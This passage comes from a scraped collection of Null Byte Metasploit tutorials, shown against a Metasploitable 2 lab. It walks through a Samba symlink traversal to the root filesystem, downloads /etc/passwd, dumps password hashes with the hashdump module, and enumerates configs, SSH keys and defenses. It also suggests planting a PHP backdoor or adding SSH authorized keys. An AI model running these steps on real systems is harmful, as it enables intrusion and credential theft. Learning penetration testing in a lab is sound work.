DistCC Daemon Command Execution\n23  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution\n24  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution\n25  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow\n26  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow\n27  exploit/windows/local/ms13_097_ie_registry_symlink   2013-12-10       great      No     MS13-097 Registry Symlink IE Sandbox Escape\n28  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource\n29  post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations\nWe received a lot of results from that search term, but the one we want to use is actually the first one. Load the module with the use command, followed by the path of the module:\nmsf5 > use auxiliary/admin/smb/samba_symlink_traversal\nNow that we are loaded into the context of the module, we can use the options command to see the settings:\nmsf5 auxiliary(admin/smb/samba_symlink_traversal) > options\nModule options (auxiliary/admin/smb/samba_symlink_traversal):\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nRHOSTS                      yes       The target address range or CIDR identifier\nRPORT      445              yes       The SMB service port (TCP)\nSMBSHARE                    yes       The name of a writeable share on the server\nSMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem\nIt looks like it already has port 445 set as the correct port for SMB, as well as the name of the directory that will be created that links to the root filesystem. We need to set the RHOSTS option as the IP address of the target:\nmsf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhosts 10.10.0.50\nrhosts => 10.10.0.50\nAnd the name of the share we want to write to, in this case, the tmp share:\nmsf5 auxiliary(admin/smb/samba_symlink_traversal) > set smbshare tmp\nsmbshare => tmp\nNow we should be all set, and all we have to do is type run at the prompt to launch the module:\nmsf5 auxiliary(admin/smb/samba_symlink_traversal) > run\n[*] Running module against 10.10.0.50\n[*] 10.10.0.50:445 - Connecting to the server...\n[*] 10.10.0.50:445 - Trying to mount writeable share 'tmp'...\n[*] 10.10.0.50:445 - Trying to link 'rootfs' to the root filesystem...\n[*] 10.10.0.50:445 - Now access the following share to browse the root filesystem:\n[*] 10.10.0.50:445 -    \\\\10.10.0.50\\tmp\\rootfs\\\n[*] Auxiliary module execution completed\nIt spits out what it is doing as it runs — we can see it first connects to the server and mounts the writable share we specified. Then, it creates a link to the root filesystem and tells us where to go to access it. Perfect.\nStep 2: Access Root Filesystem\nOnce the module does its thing, we can exit Metasploit with the exit command and connect to the target SMB share with smbclient:\nmsf5 > exit\n~# smbclient //10.10.0.50/tmp\nEnter WORKGROUP\\root's password:\nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nWe can log in anonymously again and use the ls command to view the contents of the share:\n.                                   D        0  Wed Aug  8 10:52:28 2018\n..                                 DR        0  Sun May 20 13:36:12 2012\n4600.jsvc_up                        R        0  Wed Aug  8 08:57:48 2018\n.ICE-unix                          DH        0  Wed Aug  8 08:56:05 2018\n.X11-unix                          DH        0  Wed Aug  8 08:56:51 2018\n.X0-lock                           HR       11  Wed Aug  8 08:56:51 2018\nrootfs                             DR        0  Sun May 20 13:36:12 2012\n7282168 blocks of size 1024. 5430648 blocks available\nIt looks like there's a new directory here, the one that was created with the Metasploit module. This is a link, and we can enter it just like a normal directory. Let's do that and see what's inside:\nsmb: \\> cd rootfs\\\nsmb: \\rootfs\\> ls\n.                                  DR        0  Sun May 20 13:36:12 2012\n..                                 DR        0  Sun May 20 13:36:12 2012\ninitrd                             DR        0  Tue Mar 16 17:57:40 2010\nmedia                              DR        0  Tue Mar 16 17:55:52 2010\nbin                                DR        0  Sun May 13 22:35:33 2012\nlost+found                         DR        0  Tue Mar 16 17:55:15 2010\nmnt                                DR        0  Wed Apr 28 15:16:56 2010\nsbin                               DR        0  Sun May 13 20:54:53 2012\ninitrd.img                          R  7929183  Sun May 13 22:35:56 2012\nhome                               DR        0  Fri Apr 16 01:16:02 2010\nlib                                DR        0  Sun May 13 22:35:22 2012\nusr                                DR        0  Tue Apr 27 23:06:37 2010\nproc                               DR        0  Wed Aug  8 08:55:30 2018\nroot                               DR        0  Wed Aug  8 08:56:51 2018\nsys                                DR        0  Wed Aug  8 08:55:31 2018\nboot                               DR        0  Sun May 13 22:36:28 2012\nnohup.out                           R    20962  Wed Aug  8 08:56:51 2018\netc                                DR        0  Wed Aug  8 08:56:23 2018\ndev                                DR        0  Wed Aug  8 08:56:06 2018\nvmlinuz                             R  1987288  Thu Apr 10 11:55:41 2008\nopt                                DR        0  Tue Mar 16 17:57:39 2010\nvar                                DR        0  Wed Mar 17 09:08:23 2010\ncdrom                              DR        0  Tue Mar 16 17:55:51 2010\ntmp                                 D        0  Wed Aug  8 10:52:28 2018\nsrv                                DR        0  Tue Mar 16 17:57:38 2010\n7282168 blocks of size 1024. 5430648 blocks available\nAnd there we have it — root filesystem access. We can now do things like view /etc/passwd, though we can't do that directly. Simply change into the /etc/ directory and use the get command to download the file to our machine:\nsmb: \\rootfs\\> cd etc\nsmb: \\rootfs\\etc\\> get passwd\ngetting file \\rootfs\\etc\\passwd of size 1581 as passwd (128.7 KiloBytes/sec) (average 128.7 KiloBytes/sec)\nNow we can see all the users present on the target, their home directories, and the available shells — all useful info for reconnaissance:\n~# cat passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\ndhcp:x:101:102::/nonexistent:/bin/false\nsyslog:x:102:103::/home/syslog:/bin/false\nklog:x:103:104::/home/klog:/bin/false\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nbind:x:105:113::/var/cache/bind:/bin/false\npostfix:x:106:115::/var/spool/postfix:/bin/false\nftp:x:107:65534::/home/ftp:/bin/false\npostgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nmysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false\ntomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false\ndistccd:x:111:65534::/:/bin/false\nuser:x:1001:1001:just a user,111,,:/home/user:/bin/bash\nservice:x:1002:1002:,,,:/home/service:/bin/bash\ntelnetd:x:112:120::/nonexistent:/bin/false\nproftpd:x:113:65534::/var/run/proftpd:/bin/false\nstatd:x:114:65534::/var/lib/nfs:/bin/false\nFurther Attack Scenarios\nSince we now have access to the root filesystem, there are several different paths an attacker can take. It all depends on the attacker's imagination and the configuration of the target.\nThere is one major caveat here: even though we have root access to the filesystem, we do not have root privileges. We only have the permissions associated with the anonymous login to the tmp share (usually normal user privileges). This limits what can be done, but depending on how the server is configured, there are a few things we could try.\nFor instance, since we have write access, we could place a PHP backdoor in the web root directory of Apache, and navigate to it in the browser to trigger a shell to our local machine. Another attack vector, if SSH config file permissions are lax, would be to add ourselves to the authorized keys file, allowing us to SSH into the box.\nAs a hacker, it is essential to be creative, and even in situations where escalating to shell access seems impossible, with enough patience and creativity, it can be done.\nWrapping Up\nToday, we learned about wide links in Samba and how they can be abused to access the root filesystem. After verifying we could access an SMB share, we used a Metasploit module to create a link pointing to the root directory on the server. We could then view the root filesystem and explored a couple of possible attack vectors. The ability to leverage a simple misconfiguration to exploit the system should be the goal of any white-hat hacker.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Pixabay/Pexels; Screenshots by drd_/Null Byte",
        "category": "Metasploit Basics"
    },
    {
        "title": "Quickly Gather Target Information with Metasploit Post Modules",
        "link": "https://null-byte.wonderhowto.com/how-to/quickly-gather-target-information-with-metasploit-post-modules-0199464/",
        "content": "* WonderHowTo\nPost-exploitation information gathering can be a long and drawn-out process, but it is an essential step when trying to pivot or establish advanced persistence. Every hacker should know how to enumerate a target manually, but sometimes it is worth it to automate the process. Metasploit contains post modules that can quickly gather valuable information about a target, saving both time and effort.\nIn the previous tutorial, we used Metasploit's local exploit suggester to get root on the target. To use post modules, we need to have a Meterpreter session running. These modules will run as any user to some extent, but having root-level access is ideal as it allows us unrestricted access to the system.\n* Previously: Get Root with Metasploit's Local Exploit Suggester\nWhat Information Is Most Valuable to an Attacker?\nIt has been said time and time again that reconnaissance is one of the most critical phases of an attack. It applies to not only the initial preparation for an attack, but also the post-exploitation stage. Successful mining of information after a target is compromised can lead to longer persistence and exploitation of additional machines.\nSome of the most valuable information to an attacker includes things like password hashes, credentials, and any other sensitive data that could be abused. Other items of interest are network configurations, system configurations, and config files of standard software likely to be found on the system. Checking what defenses are in place, such as antivirus or firewall rules, is also a smart move.\nModule 1: Hashdump\nTo get started, from the main prompt in Metasploit, use the sessions command to display the current sessions running in the background:\nmsf5 > sessions\nActive sessions\n===============\nId  Name  Type                   Information                                                Connection\n--  ----  ----                   -----------                                                ----------\n1         shell cmd/unix                                                                    10.10.0.1:4444 -> 10.10.0.50:58006 (10.10.0.50)\n2         meterpreter x86/linux  uid=1, gid=1, euid=1, egid=1 @ metasploitable.localdomain  10.10.0.1:4433 -> 10.10.0.50:32979 (10.10.0.50)\n3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ metasploitable.localdomain  10.10.0.1:4321 -> 10.10.0.50:56950 (10.10.0.50)\nSession 3 is ideal here since it is running as root; this is the Meterpreter session we obtained in the previous tutorial, but any root session will suffice.\nTo see the available post modules, we can start by typing the full path and quickly pressing Tab twice to see the autocomplete options:\nmsf5 > use post/linux/gather/\nuse post/linux/gather/checkcontainer         use post/linux/gather/enum_network           use post/linux/gather/enum_xchat             use post/linux/gather/openvpn_credentials\nuse post/linux/gather/checkvm                use post/linux/gather/enum_protections       use post/linux/gather/gnome_commander_creds  use post/linux/gather/phpmyadmin_credsteal\nuse post/linux/gather/ecryptfs_creds         use post/linux/gather/enum_psk               use post/linux/gather/gnome_keyring_dump     use post/linux/gather/pptpd_chap_secrets\nuse post/linux/gather/enum_commands          use post/linux/gather/enum_system            use post/linux/gather/hashdump               use post/linux/gather/tor_hiddenservices\nuse post/linux/gather/enum_configs           use post/linux/gather/enum_users_history     use post/linux/gather/mount_cifs_creds\nThe first one we will try out is the hashdump module; this will dump the password hashes for all users on the system, which can then be attempted to crack. Even though we already have root on this machine, other credentials can often be used to pivot around the network.\nLoad the module with the use command:\nmsf5 > use post/linux/gather/hashdump\nWe can then look at the options for this post module:\nmsf5 post(linux/gather/hashdump) > options\nModule options (post/linux/gather/hashdump):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nSESSION                   yes       The session to run this module on.\nThe only thing we need to set is the session to run this on. To do so, use the set command and the appropriate session number:\nmsf5 post(linux/gather/hashdump) > set session 3\nsession => 3\nThen, simply type run to launch it:\nmsf5 post(linux/gather/hashdump) > run\n[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash\n[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh\n[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false\n[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash\n[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash\n[+] Unshadowed Password File: /root/.msf4/loot/20190619120310_default_10.10.0.50_linux.hashes_719586.txt\n[*] Post module execution completed\nWe can see the hashes for all users on the system now, and it even writes this information to a file for us.\nModule 2: Checkvm\nThe next module we will try is the checkvm module; this will attempt to determine whether the target is a virtual machine or not, which can be useful information for specific exploits or attack vectors.\nLoad the module:\nmsf5 post(linux/gather/hashdump) > use post/linux/gather/checkvm\nAnd take a look at the options:\nmsf5 post(linux/gather/checkvm) > options\nModule options (post/linux/gather/checkvm):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nSESSION                   yes       The session to run this module on.\nAgain, we only need to set a session number for this module to work. Since our session number won't change going forward, we can use the setg command to set the option globally. That way, we won't have to keep typing in the same thing over and over again.\nmsf5 post(linux/gather/checkvm) > setg session 3\nsession => 3\nType run to kick it off:\nmsf5 post(linux/gather/checkvm) > run\n[*] Gathering System info ....\n[+] This appears to be a 'VirtualBox' virtual machine\n[*] Post module execution completed\nWe can see that it determines the target appears to be a VirtualBox virtual machine.\nModule 3: enum_protections\nThe next one we will try out is the enum_protections module; this tries to find certain programs on the target that can be used to detect an attack, like antivirus, firewalls, IDS/IPS, network sniffing software, and others.\nLoad the module:\nmsf5 post(linux/gather/checkvm) > use post/linux/gather/enum_protections\nSince we globally set the session option earlier, it is already set for us when we look at the options:\nmsf5 post(linux/gather/enum_protections) > options\nModule options (post/linux/gather/enum_protections):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nSESSION  3                yes       The session to run this module on.\nAll we have to do now is run the module:\nmsf5 post(linux/gather/enum_protections) > run\n[*] Running module against 10.10.0.50 [metasploitable]\n[*]                     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \\ | '_ ` _ \\ / _ \\ __/ _` / __| '_ \\| |/ _ \\| | __/ _` | '_ \\| |/ _ \\ __) || | | | | |  __/ || (_| \\__ \\ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\\___|\\__\\__,_|___/ .__/|_|\\___/|_|\\__\\__,_|_.__/|_|\\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started\n[*]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\n[*] Finding system protections...\n[+] ASLR is enabled\n[*] Finding installed applications...\n[+] ufw found: /usr/sbin/ufw\n[+] iptables found: /sbin/iptables\n[+] logrotate found: /usr/sbin/logrotate\n[+] tcpdump found: /usr/sbin/tcpdump\n[+] aa-status found: /usr/sbin/aa-status\n[*] Post module execution completed\nWe can see it gives us a banner this time, although it is a little disjointed, and information about any system protections in place. It looks like it found some firewall software, tcpdump, and ASLR is enabled; this kind of information can be very valuable when preparing an attack.\nModule 4: enum_configs\nThe next module we will try is the enum_configs module; this will attempt to find any configuration files for commonly installed software. While this information could be found manually, the module makes it easy to quickly gather everything up all at once.\nLoad the module:\nmsf5 post(linux/gather/enum_protections) > use post/linux/gather/enum_configs\nAnd run it:\nmsf5 post(linux/gather/enum_configs) > run\n[*] Running module against 10.10.0.50 [metasploitable]\n[*]                     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \\ | '_ ` _ \\ / _ \\ __/ _` / __| '_ \\| |/ _ \\| | __/ _` | '_ \\| |/ _ \\ __) || | | | | |  __/ || (_| \\__ \\ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\\___|\\__\\__,_|___/ .__/|_|\\___/|_|\\__\\__,_|_.__/|_|\\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started\n[*]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\n[+] apache2.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_509051.txt\n[+] ports.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_670485.txt\n[-] Failed to open file: /etc/nginx/nginx.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/snort/snort.conf: core_channel_open: Operation failed: 1\n[+] my.cnf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_055449.txt\n[+] ufw.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_162601.txt\n[+] sysctl.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_122073.txt\n[-] Failed to open file: /etc/security.access.conf: core_channel_open: Operation failed: 1\n[+] shells stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_678197.txt\n[-] Failed to open file: /etc/security/sepermit.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/ca-certificates.conf: core_channel_open: Operation failed: 1\n[+] access.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_706115.txt\n[-] Failed to open file: /etc/gated.conf: core_channel_open: Operation failed: 1\n[+] rpc stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_755377.txt\n[-] Failed to open file: /etc/psad/psad.conf: core_channel_open: Operation failed: 1\n[+] debian.cnf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_345601.txt\n[-] Failed to open file: /etc/chkrootkit.conf: core_channel_open: Operation failed: 1\n[+] logrotate.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_800174.txt\n[-] Failed to open file: /etc/rkhunter.conf: core_channel_open: Operation failed: 1\n[+] smb.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_570254.txt\n[+] ldap.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_677851.txt\n[-] Failed to open file: /etc/openldap/openldap.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/cups/cups.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/opt/lampp/etc/httpd.conf: core_channel_open: Operation failed: 1\n[+] sysctl.conf stored in /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_441838.txt\n[-] Failed to open file: /etc/proxychains.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/cups/snmp.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/mail/sendmail.conf: core_channel_open: Operation failed: 1\n[-] Failed to open file: /etc/snmp/snmp.conf: core_channel_open: Operation failed: 1\n[*] Post module execution completed\nWe can see it found all kinds of things, like an Apache config, sysctl, smb, and others. It also stores each of these files it finds in a directory for later use. For instance, we can view the Apache config by catting out the full path of the file:\nmsf5 post(linux/gather/enum_configs) > cat /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_509051.txt\n[*] exec: cat /root/.msf4/loot/20190619121027_default_10.10.0.50_linux.enum.conf_509051.txt\n# Based upon the NCSA server configuration files originally by Rob McCool.\n# This is the main Apache server configuration file.  It contains the\n# configuration directives that give the server its instructions.\n# See http://httpd.apache.org/docs/2.2/ for detailed information about\n# the directives.\n# Do NOT simply read the instructions in here without understanding\n# what they do.  They're here only as hints or reminders.  If you are unsure\n# consult the online docs. You have been warned.\n# The configuration directives are grouped into three basic sections:\n#  1. Directives that control the operation of the Apache server process as a\n#     whole (the 'global environment').\n#  2. Directives that define the parameters of the 'main' or 'default' server,\n#     which responds to requests that aren't handled by a virtual host.\n#     These directives also provide default values for the settings\n#     of all virtual hosts.\n#  3. Settings for virtual hosts, which allow Web requests to be sent to\n#     different IP addresses or hostnames and have them handled by the\n#     same Apache server process.\n# Configuration and logfile names: If the filenames you specify for many\n# of the server's control files begin with \"/\" (or \"drive:/\" for Win32), the\n# server will use that explicit path.  If the filenames do *not* begin\n# with \"/\", the value of ServerRoot is prepended -- so \"/var/log/apache2/foo.log\"\n# with ServerRoot set to \"\" will be interpreted by the\n# server as \"//var/log/apache2/foo.log\".\nModule 5: enum_network\nThe next module we'll run is the enum_network module; this will gather any network-related information on the target, such as IP addresses, routes, open ports, SSH configs, and DNS information.\nLoad the module:\nmsf5 post(linux/gather/enum_configs) > use post/linux/gather/enum_network\nAnd run it:\nmsf5 post(linux/gather/enum_network) > run\n[*] Running module against metasploitable.localdomain\n[*] Module running as root\n[+]                     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \\ | '_ ` _ \\ / _ \\ __/ _` / __| '_ \\| |/ _ \\| | __/ _` | '_ \\| |/ _ \\ __) || | | | | |  __/ || (_| \\__ \\ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\\___|\\__\\__,_|___/ .__/|_|\\___/|_|\\__\\__,_|_.__/|_|\\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started\n[+]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\n[*] Collecting data...\n[+] Network config stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_661472.txt\n[+] Route table stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_402588.txt\n[+] Firewall config stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_273816.txt\n[+] DNS config stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_884409.txt\n[+] SSHD config stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_100280.txt\n[+] Host file stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_071264.txt\n[+] SSH keys stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_372706.txt\n[+] Active connections stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_029831.txt\n[+] Wireless information stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_821137.txt\n[+] Listening ports stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_676900.txt\n[+] If-Up/If-Down stored in /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_258463.txt\n[*] Post module execution completed\nWe can see it collected a plethora of network information, all of which could be useful for an attacker. For example, we can view the network config file:\nmsf5 post(linux/gather/enum_network) > cat /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_661472.txt\n[*] exec: cat /root/.msf4/loot/20190619121247_default_10.10.0.50_linux.enum.netwo_661472.txt\neth0      Link encap:Ethernet  HWaddr 08:00:27:77:62:6c\ninet addr:10.10.0.50  Bcast:10.10.0.255  Mask:255.255.255.0\ninet6 addr: fe80::a00:27ff:fe77:626c/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:2643 errors:0 dropped:0 overruns:0 frame:0\nTX packets:2139 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:2268520 (2.1 MB)  TX bytes:361635 (353.1 KB)\nBase address:0xd010 Memory:f0000000-f0020000\nlo        Link encap:Local Loopback\ninet addr:127.0.0.1  Mask:255.0.0.0\ninet6 addr: ::1/128 Scope:Host\nUP LOOPBACK RUNNING  MTU:16436  Metric:1\nRX packets:325 errors:0 dropped:0 overruns:0 frame:0\nTX packets:325 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:0\nRX bytes:125465 (122.5 KB)  TX bytes:125465 (122.5 KB)\nModule 6: enum_system\nThe last module we will cover today is the enum_system module; this will collect system information about the target, including Linux version, installed packages, running services, cron jobs, and user accounts. Again, these are all things that could be found manually, but sometimes it makes more sense to have it done for you all at once.\nLoad the module:\nmsf5 post(linux/gather/enum_network) > use post/linux/gather/enum_system\nAnd run it:\nmsf5 post(linux/gather/enum_system) > run\n[+]                     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \\ | '_ ` _ \\ / _ \\ __/ _` / __| '_ \\| |/ _ \\| | __/ _` | '_ \\| |/ _ \\ __) || | | | | |  __/ || (_| \\__ \\ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\\___|\\__\\__,_|___/ .__/|_|\\___/|_|\\__\\__,_|_.__/|_|\\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started\n[+]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\n[+]     Module running as \"root\" user\n[*] Linux version stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_406677.txt\n[*] User accounts stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_739938.txt\n[*] Installed Packages stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_051826.txt\n[*] Running Services stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_438719.txt\n[*] Cron jobs stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_890911.txt\n[*] Disk info stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_036761.txt\n[*] Logfiles stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_749148.txt\n[*] Setuid/setgid files stored in /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_378666.txt\n[*] Post module execution completed\nWe can see it discovered valuable system information. For instance, we can view all the user accounts on the system:\nmsf5 post(linux/gather/enum_system) > cat /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_739938.txt\n[*] exec: cat /root/.msf4/loot/20190619121500_default_10.10.0.50_linux.enum.syste_739938.txt\nWrapping Up\nToday, we explored some of Metasploit's post modules to gather valuable information about the target. We covered modules to check for what protections are in place and whether the system is a VM or not, modules to discover configuration information pertaining to the network and common software, and even a module to dump password hashes. While all of this information can be gathered manually, Metasploit makes the job quick and painless.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Soumil Kumar/Pexels; Screenshots by drd_/Null Byte",
        "category": "Metasploit Basics"
    },
    {
        "title": "Get Root with Metasploit's Local Exploit Suggester",
        "link": "https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/",
        "content": "* WonderHowTo\nSo you've managed to get a shell on the target, but you only have measly low-level privileges. Now what? Privilege escalation is a vast field and can be one of the most rewarding yet frustrating phases of an attack. We could go the manual route, but like always, Metasploit makes it easy to perform local privilege escalation and get root with its exploit suggester module.\nTo run through the process, we're using Kali Linux as the attacking machine and Metasploitable 2 as the target. You can set up or use a similar pentesting lab — or the same one — to follow along with the guide below.\nStep 1: Get Session on Target\nThe first thing we need to do is get a session with low privileges on the target. We can easily do this with Metasploit. Type msfconsole in the terminal to launch it.\n~$ msfconsole\n[-] ***rting the Metasploit Framework console...\\\n[-] * WARNING: No database support: No database YAML file\n.,,.                  .\n.\\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P\nd8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p\nd888888P      '7$$$$\\\"\"\"\"''^^`` .7$$$|D*\"'```         ?88'\nd8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*\"`   d8P       ?8b  88P\n88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*\"`       d8P d8888b $whi?88b 88b\nd88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*\" ?88,.d88b, d88 d8P' ?88 88P `?8b\nd88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*\"`    `?88'  ?88 ?88 88b  d88 d88\n.a#$$$$$$\"`          88b  d8P  88b`?8888P'\n,s$$$$$$$\"`             888888P'   88n      _.,,,ass;:\n.a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'\n.a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'\n,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'\n.a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--\"\"''^^/$$$$$$'\n_______________________________________________________________   ,&$$$$$$'_____\n.;;lll&&&&'\n...;;lllll&'\n......;;;llll;;;....\n` ......;;;;... .  .\n=[ metasploit v5.0.20-dev                          ]\n+ -- --=[ 1886 exploits - 1065 auxiliary - 328 post       ]\n+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]\n+ -- --=[ 2 evasion                                       ]\nMetasploitable contains a vulnerable service called distccd, which is used to distribute program compilation across multiple systems, speeding things up by taking 